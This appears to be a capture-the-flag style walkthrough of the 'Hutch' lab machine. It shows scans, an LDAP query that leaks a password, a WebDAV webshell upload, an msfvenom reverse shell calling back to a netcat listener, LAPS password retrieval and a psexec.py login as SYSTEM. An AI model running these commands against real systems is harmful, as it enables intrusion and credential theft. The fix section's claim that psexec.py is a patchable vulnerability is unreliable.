---
Alias: Hutch
Date: 10/2/22
Platform: Windows
Difficulty: Intermediate
Tags: #ActiveDirectory #LDAPenumeration #LDAPsearch #Cadaver #aspxcmdWebShell #Microsoft-IIS/10.0RootDirectory #LAPS #LocalAdministratorPasswordSolution #psexec.py
Status: Finished
IP: 192.168.142.122
---

# {{Hutch}}


# Resolution summary
- discovered that the ldap domain is hutch.offsec
- Used ldapsearch to obtain the password and username
- Used the found login information to access the Cadevar tool
- Found port 80 was running Microsoft IIS
- Downloaded the aspx webshell on the cadaver target machine.
- Used a web browser to navigate to a webshell page and discovered command execution
- Googled Microsoft IIS 10.0's root directory location
- Downloaded reverse shell in cadaver
- Utilizing webshell command execution I confirmed the reverse shell was downloaded in the root directory
- Started netcat listener on kali machine
- Executed the reverse shell and received a reverse shelll
- Found Local Administrator Password Solution (LAPS) is installed on the target machine
- Performed ldapsearch query and found the administrators password
- Login as administrator utilizing psexec.py and receive a session running as nt authority/system

## Improved skills
- ldapsearch enumeration
- Findng allowed file extensions for Microsoft IIS to download a webshell
- Downloading webshells/reverse shellls while logged into cadaver tool
- Local Administrator Password Solution (LAPS) enumeration
- psexec.py 

## Used tools
- nmap
- ldapsearch
- cadaver
- psexec.py

### **Vulnerability Explanation:**

### Initial Access
##### LDAP Leaking Sensitive Information leading to logging into a webdav server to upload a web shell to root web server and executing a reverse shell

1. LDAP Information Leak:
    - Identified a misconfigured LDAP server that exposed sensitive information, including user credentials and server configurations.
    - Exploited the LDAP information leak to gather valid credentials for accessing other systems.
2. Webdav Upload and Reverse Shell:
    - Leveraged the obtained credentials to access the webdav server and upload a web shell.
    - Executed a reverse shell payload through the web shell to establish a reverse connection and gain remote access to the target system.
    - Demonstrated the ability to execute arbitrary commands with elevated privileges.


### **Vulnerability Fix:**
### Initial Access

##### LDAP Leaking Sensitive Information leading to logging into a webdav server to upload a web shell to root web server and executing a reverse shell

1. LDAP Configuration:
    - Secure the LDAP server configuration by implementing proper access controls, encryption (e.g., LDAPS), and regular security audits.
    - Avoid exposing sensitive information through LDAP queries and ensure that only authorized users have access to required data.
2. Webdav Server Security:
    - Harden the webdav server configuration by enforcing strong authentication mechanisms, access controls, and file upload restrictions.
    - Monitor and log webdav server activities to detect and respond to suspicious or unauthorized access attempts.
3. Reverse Shell Prevention:
    - Implement network segmentation and firewall rules to restrict inbound and outbound traffic, preventing unauthorized reverse shell connections.
    - Regularly update and patch systems to mitigate known vulnerabilities that could be exploited to execute reverse shells.



### **Vulnerability Explanation:**
#### Privilege Escalation
###### Retrieved administrator password by performing an ldapsearch query which led to logging in as administrator utilizing psexec.py

1. LDAP Credential Retrieval:
    - Exploited a misconfigured LDAP server to perform an ldapsearch query and retrieve administrator credentials.
    - Demonstrated the risk of exposing sensitive information via LDAP queries and improper access controls.
2. psexec.py Exploitation:
    - Leveraged the obtained administrator credentials to exploit the psexec.py vulnerability in the Windows server.
    - Successfully gained remote code execution as an administrator, allowing full control over the target system.


### **Vulnerability Fix:**
#### Privilege Escalation
###### Retrieved administrator password by performing an ldapsearch query which led to logging in as administrator utilizing psexec.py

1. LDAP Security:
    - Secure the LDAP server configuration by implementing proper access controls, encryption (e.g., LDAPS), and regular security audits.
    - Avoid exposing sensitive information through LDAP queries and ensure that only authorized users have access to required data.
2. Windows Server Hardening:
    - Patch and update the Windows server to mitigate known vulnerabilities like the psexec.py vulnerability.
    - Implement strong authentication mechanisms, firewall rules, and intrusion detection systems to prevent unauthorized access and exploitation.
3. Least Privilege Principle:
    - Follow the principle of least privilege by granting minimal permissions necessary for users and services, including LDAP query access and administrator privileges.
4. Security Awareness:
    - Educate system administrators and users about the risks associated with LDAP misconfigurations, credential retrieval vulnerabilities, and remote code execution exploits.

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.142.122 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.142.122:53
Open 192.168.142.122:80
Open 192.168.142.122:88
Open 192.168.142.122:135
Open 192.168.142.122:139
Open 192.168.142.122:389
Open 192.168.142.122:445
Open 192.168.142.122:464
Open 192.168.142.122:593
Open 192.168.142.122:3268
Open 192.168.142.122:5985
Open 192.168.142.122:9389
Open 192.168.142.122:49666
Open 192.168.142.122:49668
Open 192.168.142.122:49669
Open 192.168.142.122:49670
Open 192.168.142.122:49672
Open 192.168.142.122:49688
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-14 20:16 EDT
Initiating Ping Scan at 20:16
Scanning 192.168.142.122 [2 ports]
Completed Ping Scan at 20:16, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:16
Completed Parallel DNS resolution of 1 host. at 20:16, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:16
Scanning 192.168.142.122 [18 ports]
Discovered open port 80/tcp on 192.168.142.122
Discovered open port 139/tcp on 192.168.142.122
Discovered open port 135/tcp on 192.168.142.122
Discovered open port 53/tcp on 192.168.142.122
Discovered open port 445/tcp on 192.168.142.122
Discovered open port 49669/tcp on 192.168.142.122
Discovered open port 88/tcp on 192.168.142.122
Discovered open port 49688/tcp on 192.168.142.122
Discovered open port 389/tcp on 192.168.142.122
Discovered open port 49672/tcp on 192.168.142.122
Discovered open port 593/tcp on 192.168.142.122
Discovered open port 464/tcp on 192.168.142.122
Discovered open port 49666/tcp on 192.168.142.122
Discovered open port 49668/tcp on 192.168.142.122
Discovered open port 49670/tcp on 192.168.142.122
Discovered open port 9389/tcp on 192.168.142.122
Discovered open port 3268/tcp on 192.168.142.122
Discovered open port 5985/tcp on 192.168.142.122
Completed Connect Scan at 20:16, 0.18s elapsed (18 total ports)
Nmap scan report for 192.168.142.122
Host is up, received syn-ack (0.089s latency).
Scanned at 2022-07-14 20:16:48 EDT for 0s

PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack
80/tcp    open  http           syn-ack
88/tcp    open  kerberos-sec   syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
389/tcp   open  ldap           syn-ack
445/tcp   open  microsoft-ds   syn-ack
464/tcp   open  kpasswd5       syn-ack
593/tcp   open  http-rpc-epmap syn-ack
3268/tcp  open  globalcatLDAP  syn-ack
5985/tcp  open  wsman          syn-ack
9389/tcp  open  adws           syn-ack
49666/tcp open  unknown        syn-ack
49668/tcp open  unknown        syn-ack
49669/tcp open  unknown        syn-ack
49670/tcp open  unknown        syn-ack
49672/tcp open  unknown        syn-ack
49688/tcp open  unknown        syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds




# Nmap 7.92 scan initiated Sun Jul 17 10:38:57 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/brian/Downloads/Proving_Grounds/Hutch/results/192.168.142.122/scans/_full_tcp_nmap.txt -oX /home/brian/Downloads/Proving_Grounds/Hutch/results/192.168.142.122/scans/xml/_full_tcp_nmap.xml 192.168.142.122
Nmap scan report for 192.168.142.122
Host is up, received user-set (0.085s latency).
Scanned at 2022-07-17 10:38:57 PDT for 344s
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Sun, 17 Jul 2022 17:43:57 GMT
|_  Server Type: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-07-17 17:43:00Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack Microsoft Windows RPC
49771/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2022-07-17T17:44:02
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36496/tcp): CLEAN (Timeout)
|   Check 2 (port 46061/tcp): CLEAN (Timeout)
|   Check 3 (port 15711/udp): CLEAN (Timeout)
|   Check 4 (port 28169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 17 10:44:41 2022 -- 1 IP address (1 host up) scanned in 344.13 seconds
```

Enumerated open TCP ports:
```bash
389
3268
80
```

Enumerated top 200 UDP ports:
```bash

```

---
## Port 389/ 3268- LDAP

- To further enumerate the LDAP service, the command nmap -n -sV -Pn - script "ldap* and not brute" 192.168.142.122 was executed, revealing the domain "hutch.offsec" associated with LDAP.

![](Images/Pasted%20image%2020221019004447.png)

A subsequent LDAP search (ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.142.122" "(objectclass=*)") provided additional information, including a user named Freddy McsSorley (account name: fmcsorley) with the password "CrabSharkJellyfish192."

![](Images/Pasted%20image%2020221019005210.png)

![](Images/Pasted%20image%2020221019005459.png)

![](Images/Pasted%20image%2020221019005630.png)

## Port 80 - Microsoft IIS httpd 10.0
Using the discovered credentials, the cadaver tool was able to establish a connection to the target machine (cadaver http://192.168.142.122). A webshell (cmdasp.aspx) was then uploaded to the target machine using the put command. The webshell could be accessed at http://192.168.142.122/cmdasp.aspx, allowing command execution on the target.

![](Images/Pasted%20image%2020221019005929.png)

![](Images/Pasted%20image%2020221019010137.png)

![](Images/Pasted%20image%2020221019010408.png)

![](Images/Pasted%20image%2020221019010645.png)

![](Images/Pasted%20image%2020221019010904.png)
#aspxcmdWebShell


---

# Exploitation
##### LDAP Leaking Sensitive Information leading to logging into a webdav server to upload a web shell to root web server and executing a reverse shell

To gain a reverse shell, the root directory for Microsoft IIS 10.0 was determined through online research. Using msfvenom, a reverse shell payload was created: msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=593 -f exe > reverse.exe.

![](Images/Pasted%20image%2020221019011200.png)
#Microsoft-IIS/10.0RootDirectory

![](Images/Pasted%20image%2020221019011410.png)

The payload was hosted on our Kali machine by typing "updog -p 80"

- The payload is then uploaded to the root web server by entering the following command into the cadaver tool.

put [path where payload is located]/reverse.exe

![](Images/Pasted%20image%2020221019011613.png)

- To verify that the reverse shell payload was on the target machine, we type "dir C:\inetpub\wwwroot".
  
![](Images/Pasted%20image%2020221019011821.png)

A netcat listener was started on the Kali machine (nc -lvp 593), and the reverse shell was executed by running C:\inetpub\wwwroot\reverse.exe through the webshell. This resulted in a successful reverse shell connection.

![](Images/Pasted%20image%2020221019012059.png)

---

# Privilege Escalation
## Local Enumeration

During local enumeration, it was discovered that Microsoft's Local Administrator Password Solution (LAPS) was installed in the C:\Program Files directory.

![](Images/Pasted%20image%2020221019012502.png)

![](Images/Pasted%20image%2020221019012617.png)
#LAPS #LocalAdministratorPasswordSolution


## Privilege Escalation vector
Retrieved administrator password by performing an ldapsearch query which led to logging in as administrator utilizing psexec.py

To escalate privileges, an LDAP search was performed to retrieve the local administrator password: ldapsearch -x -H 'ldap://192.168.142.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd. The search revealed the administrator password as ",G4$4Yk-2n&x(]".

![](Images/Pasted%20image%2020221019012818.png)

Using the obtained administrator credentials, privilege escalation was achieved by logging in with psexec.py as the administrator: python psexec.py hutch.offsec/administrator:',G4$4Yk-2n&x(]'@192.168.142.122. This provided a shell running as nt authority\system.

![](Images/Pasted%20image%2020221019012951.png)

---

